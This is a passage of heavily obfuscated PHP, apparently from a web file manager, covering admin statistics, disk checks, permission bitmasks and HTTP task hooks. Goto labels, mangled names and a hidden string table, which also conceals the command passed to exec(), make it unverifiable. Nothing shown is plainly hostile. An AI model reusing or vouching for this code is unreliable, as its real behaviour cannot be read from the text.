date($b¢„ƒÍ°Â×[2071], strtotime($b¢„ƒÍ°Â×[2072])); $DŠ­‘ì·‹ = array($b¢„ƒÍ°Â×[228] => $Bèç„–™); foreach ($bÕñ†›Üéê[$f™ÛÃËò—¢] as $B ÷ãƒßãÈ => $a–ÉÒŞé¸¼) { $DŠ­‘ì·‹[$B ÷ãƒßãÈ] = 0; } $Aîø™º¥“[] = $DŠ­‘ì·‹; } $aÅø Ã‰îÈ = array(); foreach ($Aîø™º¥“ as $a–ÉÒŞé¸¼) { if ($f™ÛÃËò—¢ == $b¢„ƒÍ°Â×[2066] && $a–ÉÒŞé¸¼[$b¢„ƒÍ°Â×[2068]] > $a–ÉÒŞé¸¼[$b¢„ƒÍ°Â×[725]]) { $a–ÉÒŞé¸¼[$b¢„ƒÍ°Â×[2068]] = $a–ÉÒŞé¸¼[$b¢„ƒÍ°Â×[725]]; } foreach ($bÕñ†›Üéê[$f™ÛÃËò—¢] as $B ÷ãƒßãÈ => $B¹ÆøñŠ™ƒ) { $A–Û‚÷µçß = array($b¢„ƒÍ°Â×[228] => $a–ÉÒŞé¸¼[$b¢„ƒÍ°Â×[228]], $b¢„ƒÍ°Â×[1368] => $B¹ÆøñŠ™ƒ); $A–Û‚÷µçß[$dØÊ§Üí‹‰[$f™ÛÃËò—¢]] = isset($a–ÉÒŞé¸¼[$B ÷ãƒßãÈ]) ? $a–ÉÒŞé¸¼[$B ÷ãƒßãÈ] : 0; $aÅø Ã‰îÈ[] = $A–Û‚÷µçß; } } goto Aˆõ¹½†¹’; a„›ªÌºíØ: } public function validDate($DæìÕŠáˆ, $aŸá¼Ùøğ”) { goto EœØŠ¾×¡Ø; Aá¡»ÚËº—: switch ($DæìÕŠáˆ) { case $eõ„–ÈÙ•£[1446]: $e¢áŠğÈ°ô = mktime(0, 0, 0, date($eõ„–ÈÙ•£[2088]), date($eõ„–ÈÙ•£[2089]) - date($eõ„–ÈÙ•£[1252]) + 7 - 7, date($eõ„–ÈÙ•£[2090])); $f‹­é»×ï¢ = 0; do { $FŞØËè˜¾‹ = date($eõ„–ÈÙ•£[2071], $e¢áŠğÈ°ô - 3600 * 24 * 7 * $f‹­é»×ï¢); $f¡åÏÌ†¸[] = $FŞØËè˜¾‹; $f‹­é»×ï¢++; } while ($aŸá¼Ùøğ” < $FŞØËè˜¾‹); break; case $eõ„–ÈÙ•£[1444]: $f‹­é»×ï¢ = 1; do { $Eö•ÏœÁå  = date($eõ„–ÈÙ•£[2091], strtotime("\x2d\40{$f‹­é»×ï¢}\40\x6d\157\x6e\x74\x68\x73")); $f¡åÏÌ†¸[] = $Eö•ÏœÁå ; $f‹­é»×ï¢++; } while ($aŸá¼Ùøğ” < $Eö•ÏœÁå ); break; case $eõ„–ÈÙ•£[1756]: $Dî‰‡Ù›¨§ = (int) date($eõ„–ÈÙ•£[2090], strtotime($aŸá¼Ùøğ”)); $FÀÆ˜Â˜µâ = (int) date($eõ„–ÈÙ•£[2090]); if ($Dî‰‡Ù›¨§ >= $FÀÆ˜Â˜µâ) { break; } for ($Dî‰‡Ù›¨§; $Dî‰‡Ù›¨§ < $FÀÆ˜Â˜µâ; $Dî‰‡Ù›¨§++) { $f¡åÏÌ†¸[] = $Dî‰‡Ù›¨§ . $eõ„–ÈÙ•£[2092]; } break; default: break; } if ($aŸá¼Ùøğ” > end($f¡åÏÌ†¸)) { array_pop($f¡åÏÌ†¸); } sort($f¡åÏÌ†¸); goto bªªïÕÊŞ; bªªïÕÊŞ: return $f¡åÏÌ†¸; goto CÜ½ì†Ë˜ì; EœØŠ¾×¡Ø: $eõ„–ÈÙ•£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aœ”„ßïÏ¿ = date($eõ„–ÈÙ•£[2071], strtotime($eõ„–ÈÙ•£[2072])); $f¡åÏÌ†¸ = array($aœ”„ßïÏ¿); goto Aá¡»ÚËº—; CÜ½ì†Ë˜ì: } public function listTable($BÏÕ¸Î¨æ’) { $añİçÖó„ = ucfirst($BÏÕ¸Î¨æ’); return Model($añİçÖó„)->listData(); } public function option($CÕ¿¡ĞñÓÂ) { $bëòè“Á = $_SERVER[åÌÛ»ô¢‚ö™][2093] . ucfirst($CÕ¿¡ĞñÓÂ); return $this->{$bëòè“Á}(); } private function optionUser() { goto FèÍ´“÷ˆ½; d–˜ˆ¦‰“Ü: if (!$DªÅËñœã…) { $DªÅËñœã… = 1; } $C°†Ø–Œ½Ñ = strtotime(date($b©ë²Ñçç[2075])); $fõÆÅÏò†‰ = array($b©ë²Ñçç[2096] => array($b©ë²Ñçç[949], $C°†Ø–Œ½Ñ)); goto D½¡¼„ø…´; FèÍ´“÷ˆ½: $b©ë²Ñçç =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÂ¯Û‹¢ = Model($b©ë²Ñçç[503])->count($b©ë²Ñçç[1465]); $F¬¯à’åí‰ = Model($b©ë²Ñçç[503])->where($b©ë²Ñçç[2094])->count($b©ë²Ñçç[1465]); goto aÖ ÛÊ„Ï¥; aÖ ÛÊ„Ï¥: $C°†Ø–Œ½Ñ = strtotime($b©ë²Ñçç[2095]); $fõÆÅÏò†‰ = array($b©ë²Ñçç[2096] => array($b©ë²Ñçç[949], $C°†Ø–Œ½Ñ)); $DªÅËñœã… = (int) Model($b©ë²Ñçç[503])->where($fõÆÅÏò†‰)->count($b©ë²Ñçç[1465]); goto d–˜ˆ¦‰“Ü; D½¡¼„ø…´: $Bç»œ†ŒÓß = Model($b©ë²Ñçç[503])->where($fõÆÅÏò†‰)->count($b©ë²Ñçç[1465]); return array($b©ë²Ñçç[722] => (int) $cÂ¯Û‹¢, $b©ë²Ñçç[2097] => (int) ($cÂ¯Û‹¢ - $F¬¯à’åí‰), $b©ë²Ñçç[2098] => (int) $F¬¯à’åí‰, $b©ë²Ñçç[2099] => (int) $Bç»œ†ŒÓß, $b©ë²Ñçç[2100] => $DªÅËñœã…); goto DêÄµ¸«É; DêÄµ¸«É: } private function optionFile() { goto aãà„ÎùÈ; b‡¿¿ëª’ô: $eÍøñ‡ÑÏ = Model($a¯õ…à§¸ì[778])->where($EÔ‡ˆªÚŞ)->sum($a¯õ…à§¸ì[77]); $dÑ¡—òóĞ = Model($a¯õ…à§¸ì[778])->where($EÔ‡ˆªÚŞ)->count($a¯õ…à§¸ì[394]); return array($a¯õ…à§¸ì[725] => $E‘— ®ø§é, $a¯õ…à§¸ì[2068] => $Dƒõßô™, $a¯õ…à§¸ì[2101] => $E‘— ®ø§é - $Dƒõßô™, $a¯õ…à§¸ì[2102] => (int) $eÍøñ‡ÑÏ, $a¯õ…à§¸ì[727] => (int) $E¢½ä´‘Š, $a¯õ…à§¸ì[2103] => (int) $dÑ¡—òóĞ); goto A“Ò¼¾Œ¢; cßğ‰­È£: $Dƒõßô™ = $dÁ¦ÕÕÀóó[$a¯õ…à§¸ì[2068]]; $E¢½ä´‘Š = Model($a¯õ…à§¸ì[778])->where(array($a¯õ…à§¸ì[395] => 0))->count($a¯õ…à§¸ì[394]); $EÔ‡ˆªÚŞ = array($a¯õ…à§¸ì[395] => 0, $a¯õ…à§¸ì[200] => array($a¯õ…à§¸ì[949], strtotime(date($a¯õ…à§¸ì[2075])))); goto b‡¿¿ëª’ô; aãà„ÎùÈ: $a¯õ…à§¸ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÁ¦ÕÕÀóó = $this->sourceSize(); $E‘— ®ø§é = $dÁ¦ÕÕÀóó[$a¯õ…à§¸ì[77]]; goto cßğ‰­È£; A“Ò¼¾Œ¢: } private function optionAccess() { $f¢ì³æÛ“ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($f¢ì³æÛ“[722] => $this->typeLogCnt(), $f¢ì³æÛ“[103] => $this->typeLogCnt($f¢ì³æÛ“[103]), $f¢ì³æÛ“[429] => $this->typeLogCnt($f¢ì³æÛ“[429]), $f¢ì³æÛ“[2104] => $this->typeLogCnt($f¢ì³æÛ“[2104]), $f¢ì³æÛ“[2105] => $this->typeLogCnt($f¢ì³æÛ“[2105]), $f¢ì³æÛ“[560] => $this->typeLogCnt($f¢ì³æÛ“[33], $f¢ì³æÛ“[2079])); } private function typeLogCnt($BÓ°–œŠØ‰ = '', $DÜåÌÈÃ = "\x69\144") { goto Eååæ»İ; Eååæ»İ: $eŞ³§àìµÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BìíÑ¹Àº = array($eŞ³§àìµÀ[103] => array($eŞ³§àìµÀ[2106], $eŞ³§àìµÀ[2107]), $eŞ³§àìµÀ[429] => array($eŞ³§àìµÀ[2108], $eŞ³§àìµÀ[2109]), $eŞ³§àìµÀ[2104] => array($eŞ³§àìµÀ[2110], $eŞ³§àìµÀ[2111], $eŞ³§àìµÀ[2112]), $eŞ³§àìµÀ[2105] => array($eŞ³§àìµÀ[2113], $eŞ³§àìµÀ[2114]), $eŞ³§àìµÀ[2115] => array($eŞ³§àìµÀ[2116], $eŞ³§àìµÀ[2117], $eŞ³§àìµÀ[2118])); $a„ÀÒ¼ºˆÕ = strtotime(date($eŞ³§àìµÀ[2075])); goto F‰ìÒŒÈ¼; e•ÏÑ™: return (int) $dË‚¡¿ç„í; goto Aç¾„ùÅ×; F‰ìÒŒÈ¼: $b½âà»ïå = array($eŞ³§àìµÀ[200] => array($eŞ³§àìµÀ[949], $a„ÀÒ¼ºˆÕ)); if ($BÓ°–œŠØ‰) { $b½âà»ïå[$eŞ³§àìµÀ[29]] = array($eŞ³§àìµÀ[7], $BìíÑ¹Àº[$BÓ°–œŠØ‰]); } $dË‚¡¿ç„í = Model($eŞ³§àìµÀ[2078])->where($b½âà»ïå)->count($DÜåÌÈÃ); goto e•ÏÑ™; Aç¾„ùÅ×: } private function optionServer() { goto a‡™‚Ğãˆ”; e½¨ÙˆœÙ: $d»„ã‰ôŠ• = $DùÑ’ÜÉ–ã[0]; $bŞÒ­œŸ‹ = $GLOBALS[$dª¦á‹…™Ö[6]][$dª¦á‹…™Ö[17]]; $A¿Ş«©ƒàà = $bŞÒ­œŸ‹[$dª¦á‹…™Ö[910]]; goto d‰£¾×½”‡; a‡™‚Ğãˆ”: $dª¦á‹…™Ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $aáœÖÓ–®õ = $this->diskDriver(); $eÀñ²è«À¤ = KodIO::defaultDriver(); goto Fğ¶’´öÙ÷; Fğ¶’´öÙ÷: $C¬¯Šìù®Æ = array($dª¦á‹…™Ö[770] => $eÀñ²è«À¤[$dª¦á‹…™Ö[392]]); $B›ãÜÒ§îÑ = Model($dª¦á‹…™Ö[447])->where($C¬¯Šìù®Æ)->sum($dª¦á‹…™Ö[77]); $DùÑ’ÜÉ–ã = explode($dª¦á‹…™Ö[50], $_SERVER[$dª¦á‹…™Ö[139]]); goto e½¨ÙˆœÙ; d‰£¾×½”‡: if ($A¿Ş«©ƒàà == $dª¦á‹…™Ö[750]) { $aêŞïÂ˜® = explode($dª¦á‹…™Ö[1102], $bŞÒ­œŸ‹[$dª¦á‹…™Ö[909]]); $A¿Ş«©ƒàà = $aêŞïÂ˜®[0]; } if ($A¿Ş«©ƒàà == $dª¦á‹…™Ö[753] || $A¿Ş«©ƒàà == $dª¦á‹…™Ö[754]) { $E¢š…ñÄ» = Model()->db()->query($dª¦á‹…™Ö[2119]); $B…¥±‰ÕÜ = $E¢š…ñÄ»[0] && isset($E¢š…ñÄ»[0][$dª¦á‹…™Ö[1367]]) ? $E¢š…ñÄ»[0][$dª¦á‹…™Ö[1367]] : 0; $A¿Ş«©ƒàà = $dª¦á‹…™Ö[2120] . ($B…¥±‰ÕÜ ? $dª¦á‹…™Ö[8] . $B…¥±‰ÕÜ : $dª¦á‹…™Ö[33]); } $aˆó³©ÀÑÚ = $GLOBALS[$dª¦á‹…™Ö[6]][$dª¦á‹…™Ö[352]][$dª¦á‹…™Ö[780]]; goto fÑ²¨¨¾ÍÌ; fÑ²¨¨¾ÍÌ: return array($dª¦á‹…™Ö[2121] => $aáœÖÓ–®õ ? $aáœÖÓ–®õ[$dª¦á‹…™Ö[2122]] : 0, $dª¦á‹…™Ö[2123] => $aáœÖÓ–®õ ? $aáœÖÓ–®õ[$dª¦á‹…™Ö[2124]] : 0, $dª¦á‹…™Ö[2125] => (int) $eÀñ²è«À¤[$dª¦á‹…™Ö[2122]] * 1024 * 1024 * 1024, $dª¦á‹…™Ö[2126] => (int) $B›ãÜÒ§îÑ, $dª¦á‹…™Ö[2127] => ucfirst($d»„ã‰ôŠ•), $dª¦á‹…™Ö[2128] => $dª¦á‹…™Ö[2129] . PHP_VERSION, $dª¦á‹…™Ö[2130] => phpBuild64() ? 64 : 32, $dª¦á‹…™Ö[721] => str_replace($dª¦á‹…™Ö[2131], $dª¦á‹…™Ö[926], $A¿Ş«©ƒàà), $dª¦á‹…™Ö[352] => ucfirst($aˆó³©ÀÑÚ), $dª¦á‹…™Ö[28] => $_SERVER[$dª¦á‹…™Ö[2132]]); goto E´ËÎíï; E´ËÎíï: } private function diskDriver() { goto Eî¯ñ“Á¦; Eî¯ñ“Á¦: $A´£ª³¸ê© =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÚÙÖ°œŞè = $A´£ª³¸ê©[8]; $cŠˆ”®­¦Ü = $GLOBALS[$A´£ª³¸ê©[6]][$A´£ª³¸ê©[2133]] == $A´£ª³¸ê©[2134]; goto fº£¦×¾ß£; A­ÉİÖ¦æ§: $CøŸÂ±›‹ã = $aõ×‡‡Å - @disk_free_space($BÚÙÖ°œŞè); return array($A´£ª³¸ê©[2122] => $aõ×‡‡Å, $A´£ª³¸ê©[2124] => $CøŸÂ±›‹ã); goto fÌÅåŞğá; fº£¦×¾ß£: if ($cŠˆ”®­¦Ü) { $BÚÙÖ°œŞè = $A´£ª³¸ê©[2135]; if (function_exists($A´£ª³¸ê©[2136])) { exec($A´£ª³¸ê©[2137], $C±¯÷è®¸¯); $BÚÙÖ°œŞè = $C±¯÷è®¸¯[1] . $A´£ª³¸ê©[8]; } } if (!file_exists($BÚÙÖ°œŞè)) { return; } $aõ×‡‡Å = @disk_total_space($BÚÙÖ°œŞè); goto A­ÉİÖ¦æ§; fÌÅåŞğá: } public function fileChart($aÒ­µ’á³Á) { goto cÃÁŸˆÇªç; bö‘µ¶İ²ö: $b¶ñ´§†¦°[$B‘Ú‡¾Ùí[396]] = 2; $aÕ¿½ÑÍØ© = Model($B‘Ú‡¾Ùí[778])->where($b¶ñ´§†¦°)->sum($B‘Ú‡¾Ùí[77]); return array($B‘Ú‡¾Ùí[725] => $aÖ……³Ì½Î[$B‘Ú‡¾Ùí[77]], $B‘Ú‡¾Ùí[2068] => $aÖ……³Ì½Î[$B‘Ú‡¾Ùí[2068]], $B‘Ú‡¾Ùí[2069] => (int) $F¿Ğ„ÆŒë, $B‘Ú‡¾Ùí[2070] => (int) $aÕ¿½ÑÍØ©); goto F¬ğÚÏ¢ Æ; cÃÁŸˆÇªç: $B‘Ú‡¾Ùí =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($aÒ­µ’á³Á[$B‘Ú‡¾Ùí[1465]])) { return Model($B‘Ú‡¾Ùí[778])->userFileTypeProfile($aÒ­µ’á³Á[$B‘Ú‡¾Ùí[1465]]); } if (isset($aÒ­µ’á³Á[$B‘Ú‡¾Ùí[2138]])) { return Model($B‘Ú‡¾Ùí[778])->groupFileTypeProfile($aÒ­µ’á³Á[$B‘Ú‡¾Ùí[2138]]); } goto d¶è‰¿ã¼“; d¶è‰¿ã¼“: $aÖ……³Ì½Î = $this->sourceSize(); $b¶ñ´§†¦° = array($B‘Ú‡¾Ùí[487] => 0, $B‘Ú‡¾Ùí[396] => 1); $F¿Ğ„ÆŒë = Model($B‘Ú‡¾Ùí[778])->where($b¶ñ´§†¦°)->sum($B‘Ú‡¾Ùí[77]); goto bö‘µ¶İ²ö; F¬ğÚÏ¢ Æ: } private function sourceSize() { $DÌ¾ŞÑçØµ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÅ…Šš±İ¯ = Model($DÌ¾ŞÑçØµ[778])->where(array($DÌ¾ŞÑçØµ[395] => 0))->sum($DÌ¾ŞÑçØµ[77]); $C­ÆßİÄÖ¡ = Model($DÌ¾ŞÑçØµ[447])->sum($DÌ¾ŞÑçØµ[77]); if ($C­ÆßİÄÖ¡ > $dÅ…Šš±İ¯) { $C­ÆßİÄÖ¡ = $dÅ…Šš±İ¯; } return array($DÌ¾ŞÑçØµ[77] => (int) $dÅ…Šš±İ¯, $DÌ¾ŞÑçØµ[2068] => (int) $C­ÆßİÄÖ¡); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $E¨Ü´ççä· =& $_SERVER[åÌÛ»ô¢‚ö™]; $bæÀòÃÂ»´ = array(array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2139]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2141], $E¨Ü´ççä·[2142] => 1, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2145]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2146], $E¨Ü´ççä·[2142] => 2, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2147]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2148], $E¨Ü´ççä·[2142] => 3, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2149]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2150], $E¨Ü´ççä·[2142] => 4, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_VIEW), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2151]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2152], $E¨Ü´ççä·[2142] => 5, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2153]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2154], $E¨Ü´ççä·[2142] => 6, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($E¨Ü´ççä·[411] => LNG($E¨Ü´ççä·[2155]), $E¨Ü´ççä·[2140] => $E¨Ü´ççä·[2156], $E¨Ü´ççä·[2142] => 7, $E¨Ü´ççä·[2143] => 1, $E¨Ü´ççä·[2144] => 0)); return $bæÀòÃÂ»´; } public static function authCheck($A±†è•öç, $f™Ü“à§…è) { $A±†è•öç = intval($A±†è•öç); if (_get($GLOBALS, $_SERVER[åÌÛ»ô¢‚ö™][483])) { return !0; } if ($A±†è•öç <= 0) { return !1; } if (($A±†è•öç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A±†è•öç & $f™Ü“à§…è); } public static function authCheckShow($B¶“»÷ªš) { return self::authCheck($B¶“»÷ªš, self::AUTH_SHOW); } public static function authCheckView($bã‘ÉÎˆ×ë) { return self::authCheck($bã‘ÉÎˆ×ë, self::AUTH_VIEW); } public static function authCheckDownload($C¶­«òíà) { return self::authCheck($C¶­«òíà, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eÅŸšÃ¤Ş†) { return self::authCheck($eÅŸšÃ¤Ş†, self::AUTH_UPLOAD); } public static function authCheckEdit($dØ‡¤¤Ù¬») { return self::authCheck($dØ‡¤¤Ù¬», self::AUTH_EDIT); } public static function authCheckRemove($e²óˆÙÅÑø) { return self::authCheck($e²óˆÙÅÑø, self::AUTH_REMOVE); } public static function authCheckShare($dòŸ¤„ç–½) { return self::authCheck($dòŸ¤„ç–½, self::AUTH_SHARE); } public static function authCheckComment($Câ¨êšíß…) { return self::authCheck($Câ¨êšíß…, self::AUTH_COMMENT); } public static function authCheckEvent($c÷ÊãàâÄ…) { return self::authCheck($c÷ÊãàâÄ…, self::AUTH_EVENT); } public static function authCheckRoot($fåˆƒÕ‹ÏÆ) { return self::authCheck($fåˆƒÕ‹ÏÆ, self::AUTH_ROOT); } public static function authCheckAction($e‘ƒ—îî¾è, $A£»¤Óèöî) { goto b™î“ÊŸÈˆ; AÔˆ¬¾: $F·ŞÛ·Ç = $D‹¡…áŞ»[$A£»¤Óèöî]; $e‘ƒ—îî¾è = intval($e‘ƒ—îî¾è); if ($e‘ƒ—îî¾è <= 0) { return !1; } goto a·§¼–ÙÄš; a·§¼–ÙÄš: if (($e‘ƒ—îî¾è & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($e‘ƒ—îî¾è & $F·ŞÛ·Ç); goto bÖâ ¢Ü“Ñ; b™î“ÊŸÈˆ: $dÄù’ÑåÙÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D‹¡…áŞ» = array($dÄù’ÑåÙÏ[2157] => self::AUTH_VIEW, $dÄù’ÑåÙÏ[1067] => self::AUTH_DOWNLOAD, $dÄù’ÑåÙÏ[103] => self::AUTH_UPLOAD, $dÄù’ÑåÙÏ[2105] => self::AUTH_EDIT, $dÄù’ÑåÙÏ[2104] => self::AUTH_REMOVE, $dÄù’ÑåÙÏ[2115] => self::AUTH_SHARE, $dÄù’ÑåÙÏ[357] => self::AUTH_COMMENT, $dÄù’ÑåÙÏ[1454] => self::AUTH_EVENT, $dÄù’ÑåÙÏ[1594] => self::AUTH_ROOT); if (!isset($D‹¡…áŞ»[$A£»¤Óèöî])) { return; } goto AÔˆ¬¾; bÖâ ¢Ü“Ñ: } public static function authDisable($c†µ½¿ïˆ, $aÜÒÊ‰´) { if (intval($c†µ½¿ïˆ) <= 0) { return 0; } return intval($c†µ½¿ïˆ) & ~$aÜÒÊ‰´; } public $optionType = "\123\x79\163\x74\145\x6d\56\x73\x6f\165\x72\x63\145\101\165\x74\150\x4c\151\163\164"; public $field = array("\156\141\155\145", "\x61\165\164\150", "\154\x61\142\x65\x6c", "\x64\x69\x73\x70\x6c\141\x79", "\x73\x79\163\x74\x65\155", "\x73\157\162\164"); public function initData() { $BÔÕ§ƒ‡±  = $this->authDefault(); foreach ($BÔÕ§ƒ‡±  as $C…’Öêğ¹Œ) { $this->add($C…’Öêğ¹Œ); } } public function listData($e‚·‰ ˜ò = false, $D ©ÉãÎ© = "\163\157\162\164", $B»§‰æ•½ê = false) { return parent::listData($e‚·‰ ˜ò, $D ©ÉãÎ©, $B»§‰æ•½ê); } public function update($F³ëç×», $AĞèÑ‚œ…) { $Bø¤ÉˆË›½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÇ‘®Å£ª = parent::listData($F³ëç×»); $C‰¸Æ„ÅŠö = $this->findByName($AĞèÑ‚œ…[$Bø¤ÉˆË›½[28]]); if (!$FÇ‘®Å£ª || $C‰¸Æ„ÅŠö && $C‰¸Æ„ÅŠö[$Bø¤ÉˆË›½[392]] != $FÇ‘®Å£ª[$Bø¤ÉˆË›½[392]]) { return !1; } $this->filterAuth($AĞèÑ‚œ…[$Bø¤ÉˆË›½[401]]); return parent::update($F³ëç×», $AĞèÑ‚œ…); } public function remove($d›ªªœÁ‘) { $e¿Ú»Ú‰æ = parent::listData($d›ªªœÁ‘); if (!$e¿Ú»Ú‰æ || $e¿Ú»Ú‰æ[$_SERVER[åÌÛ»ô¢‚ö™][1106]]) { return !1; } return parent::remove($d›ªªœÁ‘); } public function add($BĞ½âÄÆ¸ = array()) { goto f”ÃàÄÀ•­; f”ÃàÄÀ•­: $d‡›‰Í¨â‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->findByName($BĞ½âÄÆ¸[$d‡›‰Í¨â‘[28]])) { return !1; } $a½©·æ²¬ = array($d‡›‰Í¨â‘[28] => $d‡›‰Í¨â‘[33], $d‡›‰Í¨â‘[401] => 1, $d‡›‰Í¨â‘[2158] => $d‡›‰Í¨â‘[2148], $d‡›‰Í¨â‘[2159] => 1, $d‡›‰Í¨â‘[1106] => 0, $d‡›‰Í¨â‘[2160] => 0); goto CÄîğ¬²ÒÚ; c²™²óÒ: return parent::insert($BĞ½âÄÆ¸); goto b¤ÉÂØ•Ùö; CÄîğ¬²ÒÚ: $BĞ½âÄÆ¸ = array_merge($a½©·æ²¬, $BĞ½âÄÆ¸); $BĞ½âÄÆ¸[$d‡›‰Í¨â‘[2160]] = $this->getSort(); $this->filterAuth($BĞ½âÄÆ¸[$d‡›‰Í¨â‘[401]]); goto c²™²óÒ; b¤ÉÂØ•Ùö: } private function getSort() { $c†ÄäëÊ’Î =& $_SERVER[åÌÛ»ô¢‚ö™]; $E«¢¡¯Åí¹ = parent::listData(); $f³‡ŠÒ®‘ = array_to_keyvalue($E«¢¡¯Åí¹, $c†ÄäëÊ’Î[33], $c†ÄäëÊ’Î[2160]); return empty($f³‡ŠÒ®‘) ? 0 : max($f³‡ŠÒ®‘) + 1; } private function filterAuth(&$E¼—œÁÙªå) { goto A·²Ü‹Ÿäë; A·²Ü‹Ÿäë: if (!$E¼—œÁÙªå) { return; } $Dµ¥”Œ›áƒ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A¾²äÊˆšŞ = array(); goto c‰¶ñˆ‡—‰; c‰¶ñˆ‡—‰: foreach ($Dµ¥”Œ›áƒ as $F¹ˆÔª¢ÜÜ) { if ($E¼—œÁÙªå & $F¹ˆÔª¢ÜÜ) { $A¾²äÊˆšŞ[] = $F¹ˆÔª¢ÜÜ; } } if (in_array(self::AUTH_ROOT, $A¾²äÊˆšŞ)) { $E¼—œÁÙªå = array_sum($Dµ¥”Œ›áƒ); return; } $e„Ü İÒ­ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f•·Ñ¿¸Á‚; f•·Ñ¿¸Á‚: foreach ($A¾²äÊˆšŞ as $F¹ˆÔª¢ÜÜ) { if (isset($e„Ü İÒ­[$F¹ˆÔª¢ÜÜ])) { $A¾²äÊˆšŞ = array_merge($A¾²äÊˆšŞ, $e„Ü İÒ­[$F¹ˆÔª¢ÜÜ]); } } $A¾²äÊˆšŞ[] = self::AUTH_SHOW; $E¼—œÁÙªå = array_sum(array_unique($A¾²äÊˆšŞ)); goto FĞù™æ™½; FĞù™æ™½: } public function sort($a×¶¤…¤©, $c÷Ö¬ùËÎ¬) { return parent::update($a×¶¤…¤©, $c÷Ö¬ùËÎ¬); } } goto b‘Ù¸¨ãŞ; CíæšŒçĞÓ: class TaskHttp extends Task { protected function startAfter() { $eëÙ©»ù·Á =& $_SERVER[åÌÛ»ô¢‚ö™]; $F‰ì¡ÂŠò³ =& $this->task; $F‰ì¡ÂŠò³[$eëÙ©»ù·Á[1529]] = 1; Hook::bind($eëÙ©»ù·Á[1502], array($this, $eëÙ©»ù·Á[1530])); Hook::bind($eëÙ©»ù·Á[1504], array($this, $eëÙ©»ù·Á[1531])); Hook::bind($eëÙ©»ù·Á[1506], array($this, $eëÙ©»ù·Á[1532])); } protected function endAfter() { $cƒÔÈ×İ• =& $_SERVER[åÌÛ»ô¢‚ö™]; Hook::unbind($cƒÔÈ×İ•[1502], array($this, $cƒÔÈ×İ•[1530])); Hook::unbind($cƒÔÈ×İ•[1504], array($this, $cƒÔÈ×İ•[1531])); Hook::unbind($cƒÔÈ×İ•[1506], array($this, $cƒÔÈ×İ•[1532])); } public function progressStart($b¼šî˜Õ÷ƒ) { $eÉÅ‹†‰Ìù =& $_SERVER[åÌÛ»ô¢‚ö™]; $b§„ ‘™Ñ† = curl_getinfo($b¼šî˜Õ÷ƒ); self::log($eÉÅ‹†‰Ìù[1533] . $b§„ ‘™Ñ†[$eÉÅ‹†‰Ìù[310]]); self::valueSet($this->task[$eÉÅ‹†‰Ìù[392]], $this->task); } public function progressEnd($Eà­ËøŸÆÀ) { $FÜø¯Ö¹‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; 